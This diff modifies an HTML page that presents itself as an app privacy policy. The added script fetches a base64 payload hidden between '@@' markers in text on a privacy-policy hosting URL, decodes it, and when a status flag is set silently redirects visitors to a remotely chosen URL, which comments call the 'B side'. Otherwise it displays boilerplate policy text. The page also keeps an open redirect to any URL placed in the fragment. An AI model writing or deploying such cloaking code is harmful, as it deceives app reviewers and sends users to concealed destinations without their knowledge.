@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en"><head>
     <script>
-        const BASE_URL = 'https://atgaxog.xyz';
+        const BASE_URL = 'https://www.termsfeed.com/live/0c36b531-146e-4692-b164-6f367e71543f';
         const SAFE_COLOR = '#eee';
     </script>
     <meta charset="UTF-8">
@@ -49,15 +49,12 @@
 </body>
 </html>
 
-
 <script>
-
     const hexToRgb = function (val) {
         const reg = /^#([0-9a-fA-f]{3}|[0-9a-fA-f]{6})$/;
         let color = val.toLowerCase();
         let result = '';
         if (reg.test(color)) {
-            // 如果只有三位的值，需变成六位，如：#fff => #ffffff
             if (color.length === 4) {
                 let colorNew = "#";
                 for (let i = 1; i < 4; i += 1) {
@@ -65,7 +62,6 @@
                 }
                 color = colorNew;
             }
-            // 处理六位的颜色值，转为RGB
             const colorChange = [];
             for (let i = 1; i < 7; i += 2) {
                 colorChange.push(parseInt("0x" + color.slice(i, i + 2)));
@@ -99,34 +95,50 @@
         if (window.location.hash) {
             setTimeout(()=>window.location.href = decodeURIComponent(window.location.hash.substring(1)), 200);
         } else {
-            fetch(BASE_URL + '/application.json5').then(r=>r.json()).then(info=>{
-                if (info.target === 'A')
-                    setTimeout(()=>window.location.href = info.url, 200);
-                else 
+            // 1. 请求纯文本
+            fetch(BASE_URL).then(r => r.text()).then(text => {
+                
+                // 2. 通过 @@ 分割并取中间元素
+                const arr = text.split('@@');
+                const midIndex = Math.floor(arr.length / 2);
+                const base64Str = arr[midIndex].trim();
+                
+                // 3. Base64 解码并转成 JSON (兼容中文)
+                const jsonStr = decodeURIComponent(escape(window.atob(base64Str)));
+                const info = JSON.parse(jsonStr);
+
+                // 4. 根据 JSON 中的状态判断走向
+                // 【注】这里假设 status 为 "1" 时代表跳转B面，如果是其他字段请自行修改条件
+                if (info.status === '1') {
+                    // 跳转链接换成了 info.introduce
+                    setTimeout(() => window.location.href = info.introduce, 200);
+                } else {
                     (() => {
-                        const content = `&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacy Policy for ${info.app_name}
-                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;At ${info.app_name} , one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by ${info.app_name} and how we ${info.app_name}e it.
-                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;If you have additional questions or require more information about our Privacy Policy, do not hesitate to contact ${info.app_name}.
+                        // 由于新 JSON 没有 app_name 字段，这里加了一个默认值 "Our App"
+                        const appName = "Our App";
+                        const content = `&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacy Policy for ${appName}
+                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;At ${appName} , one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by ${appName} and how we use it.
+                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;If you have additional questions or require more information about our Privacy Policy, do not hesitate to contact ${appName}.
                             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Log Files
-                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;${info.app_name} follows a standard procedure of ${info.app_name}ing log files. These files log visitors when they ${info.app_name}e app. The information collected by log files include internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date and time stamp, referring/exit pages, and possibly the number of clicks. These are not linked to any information that is personally identifiable. The purpose of the information is for analyzing trends, administering the app, tracking ${info.app_name}ers' movement on the app, and gathering demographic information.
+                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;${appName} follows a standard procedure of using log files. These files log visitors when they use app. The information collected by log files include internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date and time stamp, referring/exit pages, and possibly the number of clicks. These are not linked to any information that is personally identifiable. The purpose of the information is for analyzing trends, administering the app, tracking users' movement on the app, and gathering demographic information.
                             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Our Advertising Partners
-                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Some of advertisers in our app may ${info.app_name}e cookies and web beacons. Our advertising partners are listed below. Each of our advertising partners has their own Privacy Policy for their policies on ${info.app_name}er data. For easier access, we hyperlinked to their Privacy Policies below.
+                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Some of advertisers in our app may use cookies and web beacons. Our advertising partners are listed below. Each of our advertising partners has their own Privacy Policy for their policies on user data. For easier access, we hyperlinked to their Privacy Policies below.
                             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Google
                             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://policies.google.com/technologies/ads
                             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacy Policies
-                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;You may consult this list to find the Privacy Policy for each of the advertising partners of ${info.app_name} .
-                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Third-party ad servers or ad networks ${info.app_name}es technologies like cookies, JavaScript, or Beacons that are ${info.app_name}ed in their respective advertisements and links that appear on ${info.app_name} . They automatically receive your IP address when this occurs. These technologies are ${info.app_name}ed to measure the effectiveness of their advertising campaigns and/or to personalize the advertising content that you see on this app or other apps or websites.
-                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Note that ${info.app_name} has no access to or control over these cookies that are ${info.app_name}ed by third-party advertisers.
+                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;You may consult this list to find the Privacy Policy for each of the advertising partners of ${appName} .
+                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Third-party ad servers or ad networks uses technologies like cookies, JavaScript, or Beacons that are used in their respective advertisements and links that appear on ${appName} . They automatically receive your IP address when this occurs. These technologies are used to measure the effectiveness of their advertising campaigns and/or to personalize the advertising content that you see on this app or other apps or websites.
+                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Note that ${appName} has no access to or control over these cookies that are used by third-party advertisers.
                             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Third Party Privacy Policies
-                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;${info.app_name} 's Privacy Policy does not apply to other advertisers or websites. Th${info.app_name}, we are advising you to consult the respective Privacy Policies of these third-party ad servers for more detailed information. It may include their practices and instructions about how to opt-out of certain options.
+                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;${appName} 's Privacy Policy does not apply to other advertisers or websites. Thus, we are advising you to consult the respective Privacy Policies of these third-party ad servers for more detailed information. It may include their practices and instructions about how to opt-out of certain options.
                             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Children's Information
-                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Another part of our priority is adding protection for children while ${info.app_name}ing the internet. We encourage parents and guardians to observe, participate in, and/or monitor and guide their online activity.
-                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;${info.app_name} does not knowingly collect any Personal Identifiable Information from children under the age of 13. If you think that your child provided this kind of information on our App, we strongly encourage you to contact ${info.app_name} immediately and we will do our best efforts to promptly remove such information from our records.
+                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Another part of our priority is adding protection for children while using the internet. We encourage parents and guardians to observe, participate in, and/or monitor and guide their online activity.
+                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;${appName} does not knowingly collect any Personal Identifiable Information from children under the age of 13. If you think that your child provided this kind of information on our App, we strongly encourage you to contact ${appName} immediately and we will do our best efforts to promptly remove such information from our records.
                             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Online Privacy Policy Only
-                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This Privacy Policy applies only to our online activities and is valid for visitors to our App with regards to the information that they shared and/or collect in ${info.app_name} . This policy is not applicable to any information collected offline or via channels other than this app. Our Privacy Policy was created with the help of the App Privacy Policy Generator from App-Privacy-Policy.com
+                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This Privacy Policy applies only to our online activities and is valid for visitors to our App with regards to the information that they shared and/or collect in ${appName} . This policy is not applicable to any information collected offline or via channels other than this app. Our Privacy Policy was created with the help of the App Privacy Policy Generator from App-Privacy-Policy.com
                             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Consent
-                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;By ${info.app_name}ing our app, you hereby consent to our Privacy Policy and agree to its Terms and Conditions.
-                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Generated ${info.app_name}ing App Privacy Policy Generator`;
+                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;By using our app, you hereby consent to our Privacy Policy and agree to its Terms and Conditions.
+                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Generated using App Privacy Policy Generator`;
                         const page = document.querySelector('.page');
                         page.innerHTML = '';
                         page.appendChild(Object.assign(document.createElement('div'), {style: 'height: 60px;'}));
@@ -147,6 +159,11 @@
                             }
                         })
                     }) ()
+                }
+            }).catch(e => {
+                console.error("解析或请求失败:", e);
+                // 失败兜底，可根据需要直接跳转A面，如：
+                // if(window.NativeApp) window.NativeApp.closeWebView();
             });
         }
     }, 200);
